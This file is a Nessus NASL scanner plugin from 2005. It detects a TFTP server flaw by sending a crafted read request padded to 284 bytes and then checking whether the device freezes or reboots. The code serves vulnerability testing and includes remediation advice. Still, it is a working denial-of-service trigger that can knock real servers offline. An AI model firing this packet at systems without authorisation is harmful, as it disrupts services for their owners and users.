# This script was written by Josh Zlatin-Amishav <josh@tkos.co.il>
# GNU Public Licence (GPLv2)
# This plugin is just a very slightly modified version of tftpd_overflow.nasl

if(description)
{
 script_id(18493);
 script_version ("$Revision: 1.1 $");
 script_bugtraq_id(13908);
 script_name(english: "TFTPD small overflow");
 desc = "The remote TFTP server dies when it receives a small UDP 
 datagram. A malicious user may use this flaw to disable your server.

Solution : Upgrade your software, or disable this service
Risk Factor : High";

 script_description(english: desc);
 
 script_summary(english: "Crashes TFTPD with a small UDP datagram");

 script_category(ACT_KILL_HOST);
 
 script_copyright(english:"Copyright (C) 2005 Josh Zlatin-Amishav");
 script_family(english: "Gain a shell remotely");
 script_require_keys("Services/udp/tftp");
 exit(0);
}

#
include('global_settings.inc');
include('dump.inc');

if(islocalhost()) exit(0);	# ?

# This function cannot yet send UDP packets bigger than the MTU
function tftp_ping(port, huge)
{
 local_var	req, rep, sport, ip, u, filter, data, i;

 debug_print('tftp_ping: huge=', huge, '\n');

 if (huge)
  req = '\x00\x01'+crap(huge)+'\0netascii\0';
 else
  req = '\x00\x01Nessus'+rand()+'\0netascii\0';

 sport = rand() % 64512 + 1024;
 ip = forge_ip_packet(ip_hl : 5, ip_v: 4,  ip_tos:0, 
	ip_len:20, ip_off:0, ip_ttl:64, ip_p:IPPROTO_UDP,
	ip_src: this_host());
		     
 u = forge_udp_packet(ip:ip, uh_sport: sport, uh_dport:port, uh_ulen: 8 + strlen(req), data:req);

 filter = 'udp and dst port ' + sport + ' and src host ' + get_host_ip() + ' and udp[8:1]=0x00';

 data = NULL;
 for (i = 0; i < 2; i ++)	# Try twice
 {
  rep = send_packet(u, pcap_active:TRUE, pcap_filter:filter);
  if(rep)
  {
   if (debug_level > 2) dump(ddata: rep, dtitle: 'TFTP (IP)');
   data = get_udp_element(udp: rep, element:"data");
   if (debug_level > 1) dump(ddata: data, dtitle: 'TFTP (UDP)');
   if (data[0] == '\0' && (data[1] == '\x03' || data[1] == '\x05'))
   {
    debug_print('tftp_ping(port=', port, ',huge=', huge, ') succeeded\n');
    return TRUE;
   }
  }
 }
 debug_print('tftp_ping(port=', port, ',huge=', huge, ') failed\n');
 return FALSE;
}

# 
port = get_kb_item('Services/udp/tftp');
if (! port) port = 69;
if (! tftp_ping(port: port)) exit(0);

start_denial();

tftp_ping(port: port, huge: 284);

# I'll check this first, in case the device reboots
tftpalive = tftp_ping(port: port);
alive = end_denial();

if (! alive)
  security_hole(port: port, proto: "udp", data: 
"The remote device freezes or reboots when a UDP datagram of 284 bytes in length
is sent to the TFTP server.

A malicious user may use this flaw to disable this device.

Solution : Upgrade your software, or disable TFTP
Risk Factor : High");
else
 if (! tftpalive)
  security_hole(port: port, proto: "udp");

if (! alive || ! tftpalive)
 set_kb_item(name: 'tftp/'+port+'/smalloverflow', value: TRUE);
